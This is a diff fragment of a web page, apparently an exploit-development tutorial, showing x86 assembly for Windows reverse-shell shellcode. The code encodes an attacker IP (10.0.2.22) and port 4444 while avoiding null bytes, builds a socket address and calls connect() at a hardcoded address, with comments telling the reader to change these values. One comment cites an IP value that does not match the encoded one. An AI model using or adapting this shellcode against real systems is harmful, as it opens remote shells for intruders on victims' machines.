@@ -242,20 +242,17 @@ mov ebx,0x6B57555F      ; <b>Change</b> if needed! Attacker IP: 10.0.2.22. In re
                         ; hex(10) = 0x0a
                         ; 0x1602000a + 0x55555555 = 0x6B57555F
 sub ebx,0x55555555      ; Substract again 55555555 to get the original IP
-push ebx                ; Push the IP (0x1400a8c0) to the stack (No NULL bytes in the shell code!)
+push ebx                ; This will push 0x1400a8c0 to the stack without
+                        ; injecting null bytes
 push word 0x5c11        ; Push port: hex(4444) = 0x115c
 xor ebx,ebx             ; Zero out EBX
 add bl,0x2              ; sa_family: AF_INET = 2
 push word bx            ; Push sa_family parameter
 mov ebx,esp             ; EBX now has the pointer to sockaddr structure
-
 push byte 0x16          ; Size of sockaddr: sa_family + sa_data = 16
-
 push ebx                ; Push pointer ('name' parameter)
-
 push esi                ; Push saved socket handler ('s' parameter)
-
-mov ebx,0x71ab4a07      ; Address of connect()
+mov ebx,0x771e6980      ; <b>Change</b>! Address of connect()
 call ebx                ; Call connect()
 </pre>
 
